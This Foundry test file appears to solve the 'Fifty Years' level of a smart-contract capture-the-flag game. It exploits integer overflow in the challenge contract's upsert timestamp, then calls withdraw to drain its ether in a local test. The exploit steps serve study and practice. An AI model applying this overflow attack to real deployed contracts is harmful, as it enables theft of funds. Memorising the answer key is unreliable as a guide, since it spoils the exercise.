// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/math/FiftyYears.sol";
import "forge-std/console.sol";

// forge test --match-contract FiftyYearsTest -vvvv
contract FiftyYearsTest is Test {
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function testFiftyYearsHack() public {
        /****************
         * Factory setup *
         *************** */
        FiftyYearsChallenge fiftyYearsChallenge = new FiftyYearsChallenge{
            value: 1 ether
        }(player);
        vm.startPrank(player);
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        /****************
         *    Attack     *
         *************** */
        vm.warp(1576896401);
        fiftyYearsChallenge.upsert{value: 1}(1, type(uint256).max - 1 days + 1);
        fiftyYearsChallenge.upsert{value: 2}(2, 0);
        fiftyYearsChallenge.withdraw(2);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = fiftyYearsChallenge.isComplete();
        require(levelSuccessfullyPassed);
        vm.stopPrank();
        // assert(levelSuccessfullyPassed);
    }
}
